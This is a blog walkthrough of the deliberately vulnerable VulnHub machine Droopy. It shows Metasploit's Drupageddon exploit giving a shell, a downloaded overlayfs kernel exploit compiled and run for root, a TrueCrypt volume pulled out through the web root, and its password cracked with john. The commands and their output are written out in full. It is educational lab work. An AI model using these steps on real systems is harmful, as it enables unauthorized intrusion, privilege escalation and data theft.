A few days ago, I installed a new pentesting box based on Arch Linux with Kali

in a virtual machine. In order to test it I select a light vulnbox on vulnhub :
[Droopy](https://www.vulnhub.com/entry/droopy-v02,143/).
There were two hints on the description of the machine on the vulnhub download
page:

1. Grab a copy of the rockyou wordlist.
2. It's fun to read other people's email.

We will see how to use them in a moment :)

<!-- PELICAN_END_SUMMARY -->

## Discovery

Our nmap scan give us nothing but an open 80 port running a HTTP server.
Let's give a look to the website:

![Droopy homepage](/media/2016.05/droopy.png)

[Wappalyzer](https://www.wappalyzer.com/) give use the precise version of the Drupal
used (with the name and to logo of the VM it is easy to deduce that this is a
Drupal machine). The version is Drupal 7.0 which is vulnerable to CVE-2014-3704
also called
[drupal_drupageddon](https://www.rapid7.com/db/modules/exploit/multi/http/drupal_drupageddon).

## Exploit

We use metasploit to directly have the Drupal exploit AND directly a
meterpreter:

    msf > search drupal
    [!] Module database cache not built yet, using slow search

    Matching Modules
    ================

      exploit/unix/webapp/php_xmlrpc_eval            2005-06-29       excellent  PHP XML-RPC Arbitrary Code Execution

We set the RHOST to the VM's IP address

    msf exploit(drupal_drupageddon) > set RHOST 10.0.2.4

We check our options

    :::text
    msf exploit(drupal_drupageddon) > show options

    Module options (exploit/multi/http/drupal_drupageddon):

    Exploit target:

      Id  Name
      --  ----
      0   Drupal 7.0 - 7.31


We launch our exploit against the server and praise for a reverse shell:
    msf exploit(drupal_drupageddon) > exploit

## Second hint

Okay it works, we got a meterperter with the user `www-data`, let's follow the
hint a get a look to the e-mails:

    meterpreter ls /var/mail
    Listing: /var/mail
    ==================

    Mode              Size  Type  Last modified              Name

    100777/rwxrwxrwx  564   fil   2016-04-14 20:32:01 +0200  www-data

Let's read the e-mails of www-data:

    From Dave <dave@droopy.example.com> Wed Thu 14 Apr 04:34:39 2016

    George,

      I've updated the encrypted file... You didn't leave any
    hints for me. The password isn't longer than 11 characters
    and anyway, we know what academy we went to, don't you...?

    I'm sure you'll figure it out it won't rockyou too much!

    If you are still struggling, remember that song by The Jam

    Later,
    Dave

## Privilege escalation

We need a privilege escalation. Like for
[Fart-knocker](https://maggick.fr/2015/06/vulnhub-fart-knocker.html#CVE-2015-1328)
We can use the CVE-2015-1328 exploiting overlayFS to get a root shell on the
machine.

We spawn a shell:

    meterpreter > shell
    Process 1233 created.
    Channel 1 created.

We still have the permissions of `www-data`:

    id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)

We download the exploit `ofs.c`:

    wget https://www.exploit-db.com/download/37292
    --2016-05-10 15:58:12--  https://www.exploit-db.com/download/37292
    Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.8
    Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.8|:443... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 5123 (5.0K) [application/txt]
    Saving to: '37292'

        0K .....                                                 100%  358M=0s

    2016-05-10 15:58:12 (358 MB/s) - '37292' saved [5123/5123]

We rename the file:

    mv 37292 ofs.c

We compile it and add execution permission:

    gcc ofs.c -o ofs
    chmod +x ofs

Then we just run it to gain root privileges on the box:

    :::text
    ./ofs
    collect2: error: ld returned 1 exit status
    spawning threads
    mount #1
    mount #2
    child threads done
    /etc/ld.so.preload created
    creating shared library
    sh: 0: can't access tty; job control turned off
    id
    # uid=0(root) gid=0(root) groups=0(root),33(www-data)

Okay let us search for the flag:

    ls /root/
    # dave.tc

## First hint

It seems we have a truecrypt volume, let's download it on our machine for more
investigation:

    cp /root/dave.tc /var/www/html/

Then we can download it directly from the server at `http://10.0.2.4/dave.tc`

We need to extract the hashes from the file to pass them to john, hopefully a
tool exist just for that (we need to compile it):

    http://article.gmane.org/gmane.comp.security.openwall.john.user/5320

As the mail mention the academy and the hint mention the rockyou password list,
let us just extract the academy related passwords from it:

    grep academy /media/sf_password_lists/rockyou.txt > /tmp/test

We launch john against the file with our partial rockyou list:

    :::text
    john dave.tc.john -w=/tmp/test
    Warning: detected hash type "tc_aes_xts", but the string is also recognized as "tc_ripemd160"
    Use the "--format=tc_ripemd160" option to force loading these as that type instead
    Using default input encoding: UTF-8
    Loaded 6 password hashes with 6 different salts (tc_aes_xts, TrueCrypt AES256_XTS [SHA512 128/128 AVX 2x /RIPEMD160/WHIRLPOOL])
    Loaded hashes with cost 1 (hash algorithm [1:SHA512 2:RIPEMD160 3:Whirlpool]) varying from 1 to 3
    Press 'q' or Ctrl-C to abort, almost any other key for status
    0g 0:00:00:01 54.22% (ETA: 17:16:27) 0g/s 59.89p/s 359.3c/s 359.3C/s fordacademy..ffmusicacademy
    etonacademy      (truecrypt_normal_volume)

    Use the "--show" option to display all of the cracked passwords reliably
    Session completed

We mount the container using veracrypt:

    veracrypt dave.tc -tc

Let us do a `tree -a` to see what file we have in this container:

    :::text
    .
    ├── buller
    │   └── BullingdonCrest.jpg
    ├── lost+found [error opening dir]
    ├── panama
    │   └── shares.jpg
    └── .secret
        ├── piers.png
        └── .top
            └── flag.txt

    5 directories, 4 files

## Conclusion

Content of ./secret/.top/flag.txt

    Firstly, thanks for trying this VM. If you have rooted it, well done!

    Shout-outs go to #vulnhub for hosting a great learning tool. A special thanks
    goes to barrebas and junken for help in testing and final configuration.
                                                                    --knightmare

It was a nice challenge, mainly for the beginner, probably a lack in the web
part (or the use of metapsloit, spoil myself of some fun exploiting the SQL
injection manually).

Thanks to knightmare for the VM and as always thanks to vulnhub !
